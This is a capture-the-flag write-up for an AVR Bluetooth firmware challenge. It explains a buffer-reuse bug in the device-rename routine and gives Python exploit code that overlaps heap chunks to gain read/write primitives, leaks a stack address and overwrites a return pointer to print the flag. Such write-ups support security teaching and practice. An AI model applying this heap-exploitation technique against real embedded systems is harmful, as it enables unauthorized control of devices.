## Bluetooth Device Manager (200)

### Description

You have a basic car model and would like to enable some extra features? That navigation with traffic should be neat. Right. It is expensive, you know. Or not, if you can access the control interface. Try bluetooth this time. We think, it could be used for purposes other than making calls and playing MP3s.

### Write-up

Another one explotation challenge, "**such heap, much pr0!**" strings in data section give a little hint that heap explotation will be involved.

Firmware implements simple menu with creating, editing and deleting of objects, which are dynamicly allocated on heap. If we will look closer to *"Modify stored device"* code you can notice that during rename new object isn't allocated. Instead previously allocated null terminated string is reused with previous size limit. When I played with inputs I noticed that we can overwrite string termination byte and one byte next after device name, which is *malloc* header of next chunk, things becomes more interesting.

In [avr-libc](https://github.com/vancegroup-mirrors/avr-libc/blob/master/avr-libc/libc/stdlib/malloc.c) repository we can find how avr allocator is working, it's quite simple comparing to allocator for x86.

Our goal here is to allocate structure with pointers to area that we can control and we can do it by manipulationg chunk sizes, as the result we will have write and read primitive.

When we create new device 3 malloc call is invoked, one for device structure (0xb size) and two calls for *key* and *name* fields with variable size. Our strategy is to create two devices (*dev0* and *dev1*) with shortest *key* and *name* fields, then free *dev0* and create new *dev2* with *key* longer than previous, in that case *dev0* freed *key* chunk won't fit new longer *key* and new chunk will be allocated right next to *dev1* *key*. Next using "buggy" *modify* option we encrease size of *dev1* *key* chunk to 0xb (device structure size), as the result this chunk will overlap with *dev2* *key* chunk, which content can modified. Now we free *dev1* and create new *dev3*, as our prediction *dev3* struc will be allocated on crafted overlapped chunk, *name* and *key* pointer will at our control which gives us read and write primitive:

```python
    new_dev(tty,"a","b")             # dev 0
    new_dev(tty,"c","d")             # dev 1
    del_dev(tty,0)                   # free dev 0
    new_dev(tty,"e","ffffffffffff")  # dev2 with key chunk in the end
    
    edit_dev(tty,1,"z0\x0b","a")     # encrease dev1 key chunk
    del_dev(tty,1)                   # free dev 1
    new_dev(tty,"g","h")             # dev3 with overlapped chunk
```

Few things left to get the flag, to make proper jump we need to know dynamic stack frame size for main function, luckly it's just stored at data section by 0x2192 address. Other thing is that we need to replace 0xDEADBEEF to 0xBAADF00D at 0x2000:

```python
    edit_dev(tty,2,"x","\x01\x01\x01"+"\x01\x20") # set ptr to 0x2001
    edit_dev(tty,2,"x","\x01\x01\x01")            # set ptrl to 0x00 via null terminator
    edit_dev(tty,3,"g",struct.pack("I",0xBAADF00D)+"\xa0\x08\x40\x06\x04\x08\x04\x20") #write 0xbaadf00d and serial config to avoid corruption
    print repr(print_all(tty))
    
    edit_dev(tty,2,"x","\x01\x01\x01"+struct.pack("H",0x2192))  # set ptr to 0x2192
    buff=print_all(tty)                           # leak leak stack frame address
    
    dl="key: "
    buff=buff[buff.find(dl)+len(dl):]
    sp=buff[buff.find(dl)+len(dl):][:2]
    sp=struct.unpack("H",sp)[0]                  # extracting stack frame address
    print "stack frame base:", hex(sp)

    edit_dev(tty,2,"x","\x01\x01\x01"+struct.pack("H",sp-0x2))
    print edit_dev(tty,3,"g",struct.pack(">H",0x182)) # set return pointer to 0x182, big endian! - flag print
```

After everithing is done properly you will be rewarded with next 200 points.
Full script can be found among files in github repository.
